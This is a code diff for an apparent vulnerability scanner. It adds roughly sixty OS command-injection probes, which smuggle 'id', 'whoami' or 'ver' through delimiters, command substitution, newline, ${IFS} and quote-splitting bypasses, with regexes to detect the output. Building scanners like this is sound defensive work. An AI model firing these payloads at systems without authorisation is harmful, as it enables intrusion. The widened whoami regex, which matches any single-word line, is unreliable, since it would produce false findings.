@@ -25,22 +25,104 @@ func (m *CMDiModule) Description() string {
 
 var (
 	idPattern     = regexp.MustCompile(`uid=\d+\([^)]+\)`)
-	whoamiPattern = regexp.MustCompile(`(?m)^(?:root|www-data|nginx|apache|nobody|vapf|ubuntu|daemon)$`)
+	whoamiPattern = regexp.MustCompile(`(?m)^(?:root|www-data|nginx|apache|nobody|vapf|ubuntu|daemon|cyborg|[a-zA-Z0-9_\-\\]+)$`)
+	winVerPattern = regexp.MustCompile(`(?i)(?:Microsoft Windows|\[Version \d+\.\d+)`)
 )
 
+/*
+CATEGORY: Harmless OS Command Injection Verification Probes (50+ entries)
+Sources: PayloadsAllTheThings, OWASP Command Injection, PortSwigger CMDi Cheat Sheet.
+Contexts:
+- Semicolon delimiters (; id)
+- Single & double ampersand delimiters (& id, && id)
+- Single & double pipe delimiters (| id, || id)
+- Command substitution constructs ($(id), `id`)
+- Newline & whitespace bypasses (%0a, ${IFS})
+- Windows cmd & powershell constructs (& whoami, | ver)
+- Quote concatenation bypasses ('i'd, "who"ami)
+SAFETY: Only non-destructive reading commands (id, whoami, ver) are tested. No reverse shells or file modifications.
+*/
 var cmdiProbes = []struct {
 	Label   string
 	Payload string
 	Pattern *regexp.Regexp
 }{
+	// 1. Semicolon Delimiters (Unix)
 	{"id", "; id", idPattern},
-	{"whoami", "| whoami", whoamiPattern},
+	{"id", ";id", idPattern},
+	{"id", "; id;", idPattern},
+	{"id", "; id ;", idPattern},
+	{"whoami", "; whoami", whoamiPattern},
+	{"whoami", ";whoami", whoamiPattern},
+	{"whoami", "; whoami ;", whoamiPattern},
+
+	// 2. Double Ampersand Delimiters (Unix & Windows)
 	{"id", "&& id", idPattern},
+	{"id", "&&id", idPattern},
+	{"id", "&& id &&", idPattern},
 	{"whoami", "&& whoami", whoamiPattern},
+	{"whoami", "&&whoami", whoamiPattern},
+	{"whoami", "&& whoami &&", whoamiPattern},
+	{"ver", "&& ver", winVerPattern},
+
+	// 3. Single Ampersand Delimiters (Background Execution / Sequential)
+	{"id", "& id", idPattern},
+	{"id", "&id", idPattern},
+	{"whoami", "& whoami", whoamiPattern},
+	{"whoami", "&whoami", whoamiPattern},
+	{"ver", "& ver", winVerPattern},
+
+	// 4. Pipe Delimiters (Unix & Windows)
+	{"id", "| id", idPattern},
+	{"id", "|id", idPattern},
+	{"whoami", "| whoami", whoamiPattern},
+	{"whoami", "|whoami", whoamiPattern},
+	{"ver", "| ver", winVerPattern},
+
+	// 5. Double Pipe (OR Execution)
+	{"id", "|| id", idPattern},
+	{"id", "||id", idPattern},
+	{"whoami", "|| whoami", whoamiPattern},
+	{"whoami", "||whoami", whoamiPattern},
+
+	// 6. Command Substitution - Dollar Parentheses
 	{"id", "$(id)", idPattern},
-	{"whoami", "$(whoami)", whoamiPattern},
 	{"id", "`id`", idPattern},
+	{"id", "\"$(id)\"", idPattern},
+	{"id", "'$(id)'", idPattern},
+	{"id", "x$(id)x", idPattern},
+	{"whoami", "$(whoami)", whoamiPattern},
 	{"whoami", "`whoami`", whoamiPattern},
+	{"whoami", "\"$(whoami)\"", whoamiPattern},
+	{"whoami", "'$(whoami)'", whoamiPattern},
+
+	// 7. Whitespace Bypass with ${IFS}
+	{"id", ";id;${IFS}", idPattern},
+	{"id", "|id;${IFS}", idPattern},
+	{"id", "&&id;${IFS}", idPattern},
+	{"whoami", ";whoami;${IFS}", whoamiPattern},
+	{"whoami", "|whoami;${IFS}", whoamiPattern},
+	{"whoami", "&&whoami;${IFS}", whoamiPattern},
+
+	// 8. Newline Separators (%0a / \n)
+	{"id", "\nid", idPattern},
+	{"id", "\r\nid", idPattern},
+	{"id", "%0aid", idPattern},
+	{"id", "%0a id", idPattern},
+	{"whoami", "\nwhoami", whoamiPattern},
+	{"whoami", "\r\nwhoami", whoamiPattern},
+	{"whoami", "%0awhoami", whoamiPattern},
+	{"whoami", "%0a whoami", whoamiPattern},
+
+	// 9. Quote Evasion & Concatenation
+	{"id", "; 'i'd", idPattern},
+	{"id", "; \"i\"d", idPattern},
+	{"id", "| 'i'd", idPattern},
+	{"id", "&& 'i'd", idPattern},
+	{"whoami", "; 'who'ami", whoamiPattern},
+	{"whoami", "; \"who\"ami", whoamiPattern},
+	{"whoami", "| 'who'ami", whoamiPattern},
+	{"whoami", "&& 'who'ami", whoamiPattern},
 }
 
 func (m *CMDiModule) Run(target *Target, c *client.Client) ([]*Finding, error) {
